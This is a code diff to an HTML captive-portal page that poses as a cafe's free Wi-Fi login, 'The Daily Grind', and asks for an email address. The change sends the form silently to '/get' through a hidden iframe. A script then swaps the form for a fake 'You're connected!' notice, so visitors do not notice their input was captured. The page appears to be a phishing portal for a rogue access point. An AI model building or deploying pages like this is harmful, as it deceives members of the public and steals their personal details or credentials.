@@ -37,7 +37,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-heig
 <h1>The Daily Grind</h1>
 <p>Free WiFi for our customers</p>
 </div>
-<form method="POST" action="/get">
+<form id="f" method="POST" action="/get" target="h">
 <div class="field">
 <input name="email" type="text" placeholder="Email address" required autocomplete="off">
 </div>
@@ -50,11 +50,20 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-heig
 </div>
 <button class="btn" type="submit">Get Connected</button>
 </form>
+<iframe name="h" style="display:none"></iframe>
+<div id="ok" style="display:none;text-align:center;padding:20px 0">
+<div style="font-size:40px;margin-bottom:10px">&#9749;</div>
+<h2 style="color:#2d2013;font-size:18px;margin-bottom:6px">You're connected!</h2>
+<p style="font-size:13px;color:#a08d6e">Enjoy your coffee and free WiFi.<br>This page will close automatically.</p>
+</div>
+<div id="extra">
 <div class="sep">- or -</div>
 <button class="guest-btn" onclick="document.querySelector('[name=email]').focus()">Continue as Guest</button>
 <div class="hours">
 <p>Mon-Fri: 7:00 - 19:00 | Sat-Sun: 8:00 - 18:00<br>WiFi password changes daily for your security</p>
 </div>
+</div>
+<script>document.getElementById('f').addEventListener('submit',function(){setTimeout(function(){document.getElementById('f').style.display='none';document.getElementById('extra').style.display='none';document.getElementById('ok').style.display='block'},500)})</script>
 </div>
 </div>
 </body>
